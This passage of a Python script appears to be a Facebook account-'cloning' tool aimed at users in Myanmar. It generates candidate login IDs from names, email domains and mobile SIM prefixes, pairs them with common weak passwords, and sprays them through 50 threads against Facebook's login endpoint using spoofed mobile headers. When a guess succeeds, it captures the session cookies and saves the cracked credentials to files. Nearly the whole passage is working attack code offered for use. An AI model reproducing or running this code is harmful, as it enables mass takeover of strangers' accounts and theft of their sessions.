        os.system('clear')
        print(logo)
        tl = str(len(user))
        ipinfo = requests.get('http://ip-api.com/json/')
        z = json.loads(ipinfo.text)
        regi = z['regionName']
        network = z['isp']
        ip = requests.get('https://api.ipify.org').text.strip()
        loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].upper()        
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] IP ADDRESS   : \033[1;32m'+ip+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] COUNTRY      : \033[1;32m'+loc+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] REGION       : \033[1;32m'+regi+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] NETWORK      : \033[1;32m'+network+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] TOTAL ID     : \033[1;32m'+tl+'                   ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] CHOICE NAME  : \033[1;32m'+first+''+last+'.xx'+domain+'')
        print(f"\033[1;97m[\033[1;32m-\033[1;97m] If No Result \033[1;97m[\033[1;32mON\033[1;32m/\033[1;91mOFF\033[1;97m]\033[1;97m Airplane Mode.....!!!")
        print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
        for digitx in user:
            uid = random.choice([first+last[0:1]+'.'+digitx+domain,first+last+'.'+digitx+domain,first[1:]+last[1:]+'.'+digitx+domain,last+first[0:1]+'.'+digitx+domain])
            pwx=[digitx+first+last,first+last+digitx,first+digitx,last+digitx,first+last,first+' '+last,first+'123',first+'1234',first+'12345',first+'1122',first+last+'123',first+last+'1234',last+'123',last+'1234',last+'12345',last+'1122']
            morshed.submit(rcrack1,uid,pwx,tl)
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
    print(' [+]\033[1;32m [+] Total OK/CP/: '+str(len(oks))+'/'+str(len(cps)))
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')     
    
def L3():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE      - \033[1;32mzaw . phyo . lin')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    first=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER FIRST NAME : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE      - \033[1;32mmyo . wai . oo')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    last=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER LAST NAME : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE : @gmail.com , @yahoo.com')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    domain=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER YOUR DOMAIN : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE : 1000,5000,10000');jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    try:
        limit=int(input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER YOUR LIMIT : '))
    except ValueError:
        limit=5000
    for nmbr in range(limit):
        nmp="".join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=50) as morshed:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        ipinfo = requests.get('http://ip-api.com/json/')
        z = json.loads(ipinfo.text)
        regi = z['regionName']
        network = z['isp']
        ip = requests.get('https://api.ipify.org').text.strip()
        loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].upper()        
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] IP ADDRESS   : \033[1;32m'+ip+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] COUNTRY      : \033[1;32m'+loc+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] REGION       : \033[1;32m'+regi+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] NETWORK      : \033[1;32m'+network+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] TOTAL ID     : \033[1;32m'+tl+'                   ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] CHOICE NAME  : \033[1;32m'+first+''+last+'.xxx'+domain+'')
        print(f"\033[1;97m[\033[1;32m-\033[1;97m] If No Result \033[1;97m[\033[1;32mON\033[1;32m/\033[1;91mOFF\033[1;97m]\033[1;97m Airplane Mode.....!!!")
        print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
        for digitx in user:
            uid = random.choice([first+last[0:1]+'.'+digitx+domain,first+last+'.'+digitx+domain,first[1:]+last[1:]+'.'+digitx+domain,last+first[0:1]+'.'+digitx+domain])
            pwx=[digitx+first+last,first+last+digitx,first+digitx,last+digitx,first+last,first+' '+last,first+'123',first+'1234',first+'12345',first+'1122',first+last+'123',first+last+'1234',last+'123',last+'1234',last+'12345',last+'1122']
            morshed.submit(rcrack1,uid,pwx,tl)
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
    print(' [+]\033[1;32m [+] Total OK/CP/: '+str(len(oks))+'/'+str(len(cps)))
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')     
    
def L4():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE      - \033[1;32mzaw . phyo . lin')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    first=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER FIRST NAME : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE      - \033[1;32mmyo . wai . oo')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    last=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER LAST NAME : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE : @gmail.com , @yahoo.com')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    domain=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER YOUR DOMAIN : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE : 1000,5000,10000');jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    try:
        limit=int(input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER YOUR LIMIT : '))
    except ValueError:
        limit=5000
    for nmbr in range(limit):
        nmp="".join(random.choice(string.digits) for _ in range(1,5))
        user.append(nmp)
    with ThreadPool(max_workers=50) as morshed:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        ipinfo = requests.get('http://ip-api.com/json/')
        z = json.loads(ipinfo.text)
        regi = z['regionName']
        network = z['isp']
        ip = requests.get('https://api.ipify.org').text.strip()
        loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].upper()        
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] IP ADDRESS   : \033[1;32m'+ip+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] COUNTRY      : \033[1;32m'+loc+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] REGION       : \033[1;32m'+regi+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] NETWORK      : \033[1;32m'+network+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] TOTAL ID     : \033[1;32m'+tl+'                   ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] CHOICE NAME  : \033[1;32m'+first+''+last+'.xxxx'+domain+'')
        print(f"\033[1;97m[\033[1;32m-\033[1;97m] If No Result \033[1;97m[\033[1;32mON\033[1;32m/\033[1;91mOFF\033[1;97m]\033[1;97m Airplane Mode.....!!!")
        print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
        for digitx in user:
            uid = random.choice([first+last[0:1]+'.'+digitx+domain,first+last+'.'+digitx+domain,first[1:]+last[1:]+'.'+digitx+domain,last+first[0:1]+'.'+digitx+domain])
            pwx=[digitx+first+last,first+last+digitx,first+digitx,last+digitx,first+last,first+' '+last,first+'123',first+'1234',first+'12345',first+'1122',first+last+'123',first+last+'1234',last+'123',last+'1234',last+'12345',last+'1122']
            morshed.submit(rcrack1,uid,pwx,tl)
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
    print(' [+]\033[1;32m [+] Total OK/CP/: '+str(len(oks))+'/'+str(len(cps)))
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')     
    
def L5():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE      - \033[1;32mzaw . phyo . lin')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    first=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER FIRST NAME : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE      - \033[1;32mmyo . wai . oo')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    last=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER LAST NAME : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE : 1000,5000,10000');jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    try:
        limit=int(input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER YOUR LIMIT : '))
    except ValueError:
        limit=5000
    for nmbr in range(limit):
        nmp="".join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=50) as morshed:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        ipinfo = requests.get('http://ip-api.com/json/')
        z = json.loads(ipinfo.text)
        regi = z['regionName']
        network = z['isp']
        ip = requests.get('https://api.ipify.org').text.strip()
        loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].upper()        
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] IP ADDRESS   : \033[1;32m'+ip+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] COUNTRY      : \033[1;32m'+loc+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] REGION       : \033[1;32m'+regi+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] NETWORK      : \033[1;32m'+network+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] TOTAL ID     : \033[1;32m'+tl+'                   ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] CHOICE NAME  : \033[1;32m'+first+'.'+last+'')
        print(f"\033[1;97m[\033[1;32m-\033[1;97m] If No Result \033[1;97m[\033[1;32mON\033[1;32m/\033[1;91mOFF\033[1;97m]\033[1;97m Airplane Mode.....!!!")
        print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
        for digitx in user:
            uid = random.choice([first+'.'+last[0:1]+'.'+digitx,first+'.'+last+'.'+digitx,first[1:]+'.'+last[1:]+'.'+digitx])
            pwx = ['u'+first+last,'mg'+first+last,'ko'+first+last,'daw'+first+last,'ma'+first+last,'oo'+first+last,first+last,first+' '+last,first+'123',first+'1234',first+'12345',first+'1122',first+last+'123',first+last+'1234',first+last+'12345',last+'123',last+'1234',last+'12345',last+'1122']
            morshed.submit(rcrack1,uid,pwx,tl)
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
    print(' [+]\033[1;32m [+] Total OK/CP/: '+str(len(oks))+'/'+str(len(cps)))
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')     

def rcrack1(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    try:
        for ps in pwx:
            pro = random.choice(ugen2)
            session = requests.Session()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'm.facebook.com',
             "method": 'GET',
             "scheme": 'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
             'cache-control': 'max-age=0',
             'sec-ch-prefers-color-scheme': 'dark',
             'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
             'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.27"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
             'sec-ch-ua-platform-version': '"10.0.0"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': pro}
            lo = session.post('https://web.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\r\033[1;32m[MKL-OK] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;36m'+coki+'\033[0;97m')
                print('\033[1;34m  >>>-----------------------------------------------➤')
                cek_apk(session,coki)
                open('/sdcard/MKL-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                print('\r\r\33[1;31m[MKL-CP] ' +uid+ ' | ' +ps+'')
                open('/sdcard/MKL-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s[MKL-M2]-[%s]-[%s]-[OK]-[%s]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass       
        
        
def M3():
    os.system('clear')
    print(logo)
    print(f"\033[1;31m[\033[1;96m1\033[1;31m] \033[1;32mRANDOM CLONING")   
    print(f"\033[1;31m[\033[1;96m2\033[1;31m] \033[1;32mGMAIL CLONING \033[1;36m(digitx 2)")   
    print(f"\033[1;31m[\033[1;96m3\033[1;31m] \033[1;32mGMAIL CLONING \033[1;36m(digitx 3)")   
    print(f"\033[1;31m[\033[1;96m4\033[1;31m] \033[1;32mGMAIL CLONING \033[1;36m(digitx 4)")   
    print(f"\033[1;31m[\033[1;96m5\033[1;31m] \033[1;32mUSER NAME CLONING")   
    print(f"\033[1;31m[\033[1;96m0\033[1;31m] \033[1;31mEXIT")
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    mkl = input(f'\033[1;32m[•] YOUR CHOICE : ')
    if mkl in ["1"]:
        mkl1()
    if mkl in ["2"]:
        mkl2()
    if mkl in ["3"]:
        mkl3()
    if mkl in ["4"]:
        mkl4()
    if mkl in ["5"]:
        mkl5()
    if mkl in ["0"]:
        os.system('exit')
        
def mkl1():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mATOM CODE      - \033[1;32m799 789 779 769 759')
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mMPT CODE       - \033[1;32m429 419 409 259 269')
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mOOREDOO CODE   - \033[1;32m989 979 969 959 949')
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mMYTEL CODE     - \033[1;32m699 689 679 669 659')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    code = input('\033[1;31m[\033[1;96m•\033[1;31m] \033[1;32m SIM CODE : ')
    os.system('clear')
    print(logo)
    print('\033[1;31m[\033[1;96m•\033[1;31m] \033[1;32mCLONING LIMIT= 2000•5000•10000•15000•50000')
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    limit = int(input('\033[1;31m[\033[1;96m•\033[1;31m] \033[1;32mYOUR CLONING LIMIT : '))
    
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with ThreadPool(max_workers=50) as morshed:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        ipinfo = requests.get('http://ip-api.com/json/')
        z = json.loads(ipinfo.text)
        regi = z['regionName']
        network = z['isp']
        ip = requests.get('https://api.ipify.org').text.strip()
        loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].upper()        
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] IP ADDRESS   : \033[1;32m'+ip+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] COUNTRY      : \033[1;32m'+loc+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] REGION       : \033[1;32m'+regi+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] NETWORK      : \033[1;32m'+network+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] TOTAL ID     : \033[1;32m'+tl+'                   ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] CHOICE CODE  : \033[1;32m'+code+'             ')
        print(f"\033[1;97m[\033[1;32m-\033[1;97m] If No Result \033[1;97m[\033[1;32mON\033[1;32m/\033[1;91mOFF\033[1;97m]\033[1;97m Airplane Mode.....!!!")
        print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
        for love in user:
            uid = '09'+code+love
            pwx = [uid,love,code+love,code+love[:3],'myanmar','myanmar123','Myanmar','Myanmar123']
            morshed.submit(rcrack2,uid,pwx,tl)
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
    print(' [+]\033[1;32m [+] Total OK/CP/: '+str(len(oks))+'/'+str(len(cps)))
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')     

def mkl2():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE      - \033[1;32mzaw . phyo . lin')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    first=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER FIRST NAME : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE      - \033[1;32mmyo . wai . oo')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    last=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER LAST NAME : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE : @gmail.com , @yahoo.com')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    domain=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER YOUR DOMAIN : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE : 1000,5000,10000');jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    try:
        limit=int(input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER YOUR LIMIT : '))
    except ValueError:
        limit=5000
    for nmbr in range(limit):
        nmp="".join(random.choice(string.digits) for _ in range(1,3))
        user.append(nmp)
    with ThreadPool(max_workers=50) as morshed:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        ipinfo = requests.get('http://ip-api.com/json/')
        z = json.loads(ipinfo.text)
        regi = z['regionName']
        network = z['isp']
        ip = requests.get('https://api.ipify.org').text.strip()
        loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].upper()        
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] IP ADDRESS   : \033[1;32m'+ip+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] COUNTRY      : \033[1;32m'+loc+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] REGION       : \033[1;32m'+regi+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] NETWORK      : \033[1;32m'+network+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] TOTAL ID     : \033[1;32m'+tl+'                   ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] CHOICE NAME  : \033[1;32m'+first+''+last+'.xx'+domain+'')
        print(f"\033[1;97m[\033[1;32m-\033[1;97m] If No Result \033[1;97m[\033[1;32mON\033[1;32m/\033[1;91mOFF\033[1;97m]\033[1;97m Airplane Mode.....!!!")
        print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
        for digitx in user:
            uid = random.choice([first+last[0:1]+'.'+digitx+domain,first+last+'.'+digitx+domain,first[1:]+last[1:]+'.'+digitx+domain,last+first[0:1]+'.'+digitx+domain])
            pwx=[digitx+first+last,first+last+digitx,first+digitx,last+digitx,first+last,first+' '+last,first+'123',first+'1234',first+'12345',first+'1122',first+last+'123',first+last+'1234',last+'123',last+'1234',last+'12345',last+'1122']
            morshed.submit(rcrack2,uid,pwx,tl)
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
    print(' [+]\033[1;32m [+] Total OK/CP/: '+str(len(oks))+'/'+str(len(cps)))
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')     
    
def mkl3():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE      - \033[1;32mzaw . phyo . lin')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    first=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER FIRST NAME : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE      - \033[1;32mmyo . wai . oo')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    last=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER LAST NAME : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE : @gmail.com , @yahoo.com')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    domain=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER YOUR DOMAIN : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE : 1000,5000,10000');jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    try:
        limit=int(input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER YOUR LIMIT : '))
    except ValueError:
        limit=5000
    for nmbr in range(limit):
        nmp="".join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=50) as morshed:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        ipinfo = requests.get('http://ip-api.com/json/')
        z = json.loads(ipinfo.text)
        regi = z['regionName']
        network = z['isp']
        ip = requests.get('https://api.ipify.org').text.strip()
        loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].upper()        
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] IP ADDRESS   : \033[1;32m'+ip+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] COUNTRY      : \033[1;32m'+loc+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] REGION       : \033[1;32m'+regi+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] NETWORK      : \033[1;32m'+network+'       ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] TOTAL ID     : \033[1;32m'+tl+'                   ')
        print(f'\033[1;97m[\033[1;32m-\033[1;97m] CHOICE NAME  : \033[1;32m'+first+''+last+'.xxx'+domain+'')
        print(f"\033[1;97m[\033[1;32m-\033[1;97m] If No Result \033[1;97m[\033[1;32mON\033[1;32m/\033[1;91mOFF\033[1;97m]\033[1;97m Airplane Mode.....!!!")
        print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
        for digitx in user:
            uid = random.choice([first+last[0:1]+'.'+digitx+domain,first+last+'.'+digitx+domain,first[1:]+last[1:]+'.'+digitx+domain,last+first[0:1]+'.'+digitx+domain])
            pwx=[digitx+first+last,first+last+digitx,first+digitx,last+digitx,first+last,first+' '+last,first+'123',first+'1234',first+'12345',first+'1122',first+last+'123',first+last+'1234',last+'123',last+'1234',last+'12345',last+'1122']
            morshed.submit(rcrack2,uid,pwx,tl)
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
    print(' [+]\033[1;32m [+] Total OK/CP/: '+str(len(oks))+'/'+str(len(cps)))
    print('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')     
    
def mkl4():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE      - \033[1;32mzaw . phyo . lin')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    first=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER FIRST NAME : ')
    os.system('clear')
    print(logo)
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mEXAMPLE      - \033[1;32mmyo . wai . oo')
    jalan('\033[1;93m×××××××××××××××××××××××××××××××××××××××××××××××××××××××')
    last=input('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;32mENTER LAST NAME : ')
    os.system('clear')
    print(logo)
